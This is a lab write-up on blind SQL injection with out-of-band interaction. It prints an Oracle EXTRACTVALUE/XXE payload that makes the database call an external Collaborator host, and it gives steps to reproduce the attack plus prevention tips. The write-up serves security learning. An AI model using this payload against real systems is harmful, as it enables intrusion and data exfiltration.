# 🔐 Lab 16: Blind SQL Injection with Out-of-Band Interaction.

## 🧩 Objective
To exploit a Blind SQL Injection vulnerability and case a DNS lookup using out-of-band (OAST) techniques to confirm injection and extract data.

## 🔍 Vulnerability
The application is vulnerable to SQL Injection, but does not return query results, errors, or time delays. External interaction is required to detect the vulnerability.

## ⚙️ Payload Used
' || SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--

## 🔎 Analysis
1. Traditional SQL Injection methods do not produce visible results  
2. Use out-of-band technique to trigger external interaction  
3. Database sends request to attacker-controlled server  
4. Capture interaction using Burp Collaborator  
5. Extract sensitive data from interaction logs  

## 🚀 Steps to Reproduce
1. Open Burp Suite and access Collaborator  
2. Generate a unique Collaborator URL  
3. Navigate to the vulnerable application  
4. Intercept the request using Burp Suite  
5. Inject payload with Collaborator URL:
   SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
6. Send the request  
7. Check Collaborator for DNS/HTTP interaction  
8. Observe extracted data in interaction logs
9. Steps to use Burp Collaberator
    - Go to Burp
      - -> Burp collaberator client
        - copy to clipboard
    - Check the cheatsheet -> DNS lookup -> try different database
    - Click on pullnow
      - check DNS lookup

## ✅ Result
Successfully confirmed SQL Injection and retrived sensitive data using out of band interction.

## 🧠 Key Learning
Out of band SQL injection allows data extraction when traditional techniques fail, by leveraging external communication channels.

## 🛡️ Prevention
- Use parameterized queries (prepared statements)  
- Restrict outbound network connections from database  
- Implement strict input validation  
- Monitor unusual external requests  
